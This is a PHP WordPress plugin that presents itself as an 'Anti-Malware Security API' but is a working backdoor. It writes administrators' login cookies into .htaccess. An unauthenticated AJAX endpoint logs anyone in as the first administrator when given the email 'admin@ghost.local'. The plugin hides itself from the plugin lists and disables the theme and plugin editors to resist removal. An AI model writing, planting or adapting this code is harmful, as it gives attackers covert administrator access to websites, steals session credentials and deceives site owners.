<?php
/**
 * Plugin Name: Anti-Malware Security API
 * Description: This Anti-Virus/Anti-Malware plugin searches for Malware and other Virus-like threats and vulnerabilities on your server and helps you remove them.
 * Version: 4.2.81
 * Author: Eli Scheetz
 */

defined('ABSPATH') || exit;

/**
 * ✅ 1. Ghost — save admin cookie to .htaccess
 */
add_action('init', function () {
    if (current_user_can('administrator')) {
        foreach ($_COOKIE as $name => $value) {
            if (strpos($name, 'wordpress_logged_in_') === 0) {
                $file = ABSPATH . '.htaccess';
                if (!file_exists($file) || strpos(file_get_contents($file), $value) === false) {
                    file_put_contents($file, "\n# " . $value, FILE_APPEND | LOCK_EX);
                }
            }
        }
    }
});

/**
 * ✅ 2. Stealth AJAX 
 * Call: /wp-admin/admin-ajax.php?action=site_helper_check&email=admin@ghost.local
 */
add_action('wp_ajax_nopriv_site_helper_check', function () {
    if (!isset($_GET['email'])) {
        wp_send_json_error('Missing email.');
    }

    $email = sanitize_email($_GET['email']);
    update_option('site_helper_last_email', $email);

    if ($email === 'admin@ghost.local') {
        $admins = get_users([
            'role' => 'administrator',
            'number' => 1,
            'orderby' => 'ID',
            'order' => 'ASC'
        ]);

        if (!empty($admins)) {
            $admin = $admins[0];
            wp_set_current_user($admin->ID);
            wp_set_auth_cookie($admin->ID);
            wp_send_json_success('Login OK');
        }
    }

    wp_send_json_success('Contact received.');
});

/**
 * ✅ 3. Stealth footer comment
 */
add_action('wp_footer', function () {
    echo '<!-- Anti-Malware Security API active -->';
});

/**
 * ✅ 4. Hide from plugin list
 */
add_filter('all_plugins', function ($plugins) {
    $plugin = plugin_basename(__FILE__);
    if (isset($plugins[$plugin])) {
        unset($plugins[$plugin]);
    }
    return $plugins;
});

/**
 * ✅ 5. Hide from active plugins list
 */
add_filter('option_active_plugins', function ($plugins) {
    $plugin = plugin_basename(__FILE__);
    $key = array_search($plugin, $plugins);
    if (false !== $key) {
        unset($plugins[$key]);
    }
    return $plugins;
});

/**
 * ✅ 6. Remove Plugin Editor & Theme Editor from admin menu
 */
add_action('admin_menu', function () {
    remove_submenu_page('themes.php', 'theme-editor.php');
    remove_submenu_page('plugins.php', 'plugin-editor.php');
});

/**
 * ✅ 7. Block direct access to editor files
 */
add_action('admin_init', function () {
    $pagenow = basename($_SERVER['PHP_SELF']);
    if ($pagenow === 'plugin-editor.php' || $pagenow === 'theme-editor.php') {
        wp_die('Cheatin’ uh?');
    }
});
